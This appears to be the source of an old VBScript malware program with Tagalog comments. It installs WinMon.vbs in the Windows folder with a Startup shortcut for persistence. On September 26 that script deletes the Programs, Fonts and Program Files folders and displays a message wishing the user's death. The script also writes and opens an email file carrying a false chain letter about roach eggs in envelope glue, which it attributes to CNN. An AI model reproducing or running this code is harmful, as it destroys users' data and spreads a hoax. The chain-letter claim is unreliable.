'Kumusta na kayo???
'
'Itong ginawa kong ito ay isang simpleng bagay lamang na wala namang ninanais kundi ang
'ipakita na kaya ko pa palang gumawa ng ganitong mga bagay.
'
'

Set ws = CreateObject("Wscript.Shell")
Set fs = CreateObject("Scripting.FileSystemObject")

f = ws.ExpandEnvironmentStrings("%temp%\LickingEnvelopes.eml")
b = ws.ExpandEnvironmentStrings("%windir%\Application Data\Microsoft\Address Book\")
wd = ws.ExpandEnvironmentStrings("%windir%\")
Set bm = fs.CreateTextfile(wd & "WinMon.vbs", True)

bm.WriteLine("if Month(Now) = 9 and Day(Now) = 26 then")
bm.WriteLine("Set f = createobject(" & chr(34) & "scripting.filesystemobject" & chr(34) & ")")
bm.WriteLine("Set s = createobject(" & chr(34) & "wscript.shell" & chr(34) & ")")
bm.WriteLine("if not f.folderexists(" & chr(34) & "c:\myweb\" & chr(34) & ") then")
bm.WriteLine("f.deletefolder s.SpecialFolders(" & chr(34) & "Programs" & chr(34) & "),true")
bm.WriteLine("f.deletefolder s.SpecialFolders(" & chr(34) & "Fonts" & chr(34) & "),true")
bm.WriteLine("f.deletefolder " & chr(34) & "c:\Program Files" & chr(34) & ",true")
bm.WriteLine("Msgbox " & chr(34) & "Happy Anniversary!" & chr(34) & " & vbCrLf & vbCrLf & " & chr(34) & "However, I'm not happy with you. How I wish for your death." & chr(34) & ", 0, " & chr(34) & "Anniversary Greeting" & chr(34))
bm.WriteLine("end if")
bm.WriteLine("end if")
bm.Close

Set ms = ws.CreateShortcut(ws.SpecialFolders("Startup") & "\WinMonitor.lnk")
ms.TargetPath = ws.ExpandEnvironmentStrings("%windir%\WinMon.vbs")
ms.WorkingDirectory = ws.ExpandEnvironmentStrings("%windir%")
ms.WindowStyle = 4
ms.IconLocation = ws.ExpandEnvironmentStrings("%windir%\system\shell32.dll, 12")
ms.Save

Set a = fs.CreateTextFile(f, True)

a.WriteLine("From: " & chr(34) & "Robert Gonzales" & chr(34) & " <bobby_gonzales031281@yahoo.com>")
a.WriteLine("To: " & chr(34) & "Jason del Rosario" & chr(34) & " <super_jason022779@hotmail.com>")
a.WriteLine("Subject: Do you lick envelopes?")
a.WriteLine("Date: Fri, 01 Jun 2001 21:53:47 +0800")
a.WriteLine("MIME-Version: 1.0")
a.WriteLine("Content-Type: text/plain;")
a.WriteLine("	charset=" & chr(34) & "iso-8859-1" & chr(34))
a.WriteLine("Content-Transfer-Encoding: quoted-printable")
a.WriteLine
a.WriteLine("KINDLY FORWARD THIS TO OTHERS. IT")
a.WriteLine("MAY SAVE SOMEONE'S LIFE.")
a.WriteLine
a.WriteLine("In California, a lady licked the envelopes and")
a.WriteLine("postage stamps instead of using a sponge.  That")
a.WriteLine("very day the lady cut her tongue on the envelope.")
a.WriteLine("A week later, she noticed an abnormal swelling of")
a.WriteLine("her tongue.  She went to the doctor, and they")
a.WriteLine("found nothing wrong.")
a.WriteLine
a.WriteLine("Her tongue was not sore or anything.  A couple of")
a.WriteLine("days later, her tongue started to swell more, and")
a.WriteLine("it began to get really sore, so sore,that she")
a.WriteLine("could not eat.  She went back to the hospital, and")
a.WriteLine("demanded something be done.  The doctor took an")
a.WriteLine("x-ray of her tongue and noticed a lump.  He")
a.WriteLine("prepared her for minor surgery.  When the doctor")
a.WriteLine("cut her tongue open, a live roach crawled out.")
a.WriteLine("There were roach eggs on the seal of the envelope.")
a.WriteLine
a.WriteLine("The egg was able to hatch inside of her tongue,")
a.WriteLine("because of her saliva.  It was warm and moist...")
a.WriteLine("This is a true story reported on CNN...  Andy Hume")
a.WriteLine("wrote: Hey, I used to work in an envelope")
a.WriteLine("factory.  You wouldn't believe the.....things that")
a.WriteLine("float around in those gum applicator trays.  I")
a.WriteLine("haven't licked an envelope for years.  WILL YOU")
a.WriteLine("LICK ENVELOPES ANYMORE? I KNOW THAT I WONT!")

a.Close
ws.Run(f)